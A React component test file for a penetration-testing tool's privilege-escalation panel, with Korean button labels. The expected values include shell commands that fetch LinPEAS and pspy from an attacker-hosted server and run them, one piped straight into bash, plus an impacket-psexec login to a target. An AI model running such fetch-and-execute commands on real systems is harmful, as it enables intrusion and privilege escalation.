// @vitest-environment jsdom
import {cleanup, fireEvent, render, screen} from "@testing-library/react";
import {afterEach, expect, it, vi} from "vitest";
import PrivescSessionPanel from "./PrivescSessionPanel";

vi.mock("./InteractiveTerminal", () => ({
  default: ({initialInput}: {initialInput: string}) =>
    <div data-testid="terminal-prefill">{initialInput}</div>,
}));

afterEach(cleanup);

it("renders nothing without an open session", () => {
  const {container} = render(
    <PrivescSessionPanel serverBusy={false} onToggleServer={vi.fn()}
      onSendCommand={vi.fn()} onClose={vi.fn()} />,
  );
  expect(container.firstChild).toBeNull();
});

it("prefills the shell and only queues LinPEAS/WinPEAS/pspy commands once the server is running", () => {
  const onSendCommand = vi.fn();
  const onToggleServer = vi.fn();
  render(
    <PrivescSessionPanel
      session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
      server={{running: true, base_url: "http://10.10.14.1:8000",
        available: {peass: true, pspy: true}}}
      serverBusy={false} onToggleServer={onToggleServer}
      onSendCommand={onSendCommand} onClose={vi.fn()} />,
  );
  expect(screen.getByTestId("terminal-prefill").textContent).toBe(
    "impacket-psexec admin@10.10.10.10",
  );
  expect(screen.getByText(/tun0에서 서비스 중/)).toBeTruthy();
  fireEvent.click(screen.getByText("서버 중지"));
  expect(onToggleServer).toHaveBeenCalledOnce();
  fireEvent.click(screen.getByText("LinPEAS 명령 셸에 입력"));
  expect(onSendCommand).toHaveBeenCalledWith(
    "curl -sS http://10.10.14.1:8000/peass/linpeas/linpeas.sh | bash",
  );
  fireEvent.click(screen.getByText("pspy 명령 셸에 입력"));
  expect(onSendCommand).toHaveBeenCalledWith(
    "curl -sS http://10.10.14.1:8000/pspy/pspy64 -o /tmp/pspy64 "
    + "&& chmod +x /tmp/pspy64 && /tmp/pspy64",
  );
});

it("disables LinPEAS/WinPEAS/pspy buttons while the server is stopped", () => {
  render(
    <PrivescSessionPanel session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
      server={{running: false}} serverBusy={false} onToggleServer={vi.fn()}
      onSendCommand={vi.fn()} onClose={vi.fn()} />,
  );
  expect(screen.getByText("LinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText("WinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText("pspy 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText("서버 시작")).toBeTruthy();
});

it("disables only the pspy button when pspy is not installed but peass is", () => {
  render(
    <PrivescSessionPanel session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
      server={{running: true, base_url: "http://10.10.14.1:8000",
        available: {peass: true, pspy: false}}}
      serverBusy={false} onToggleServer={vi.fn()}
      onSendCommand={vi.fn()} onClose={vi.fn()} />,
  );
  expect(screen.getByText("LinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(false);
  expect(screen.getByText("pspy 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText(/pspy가 설치되어 있지 않아/)).toBeTruthy();
});
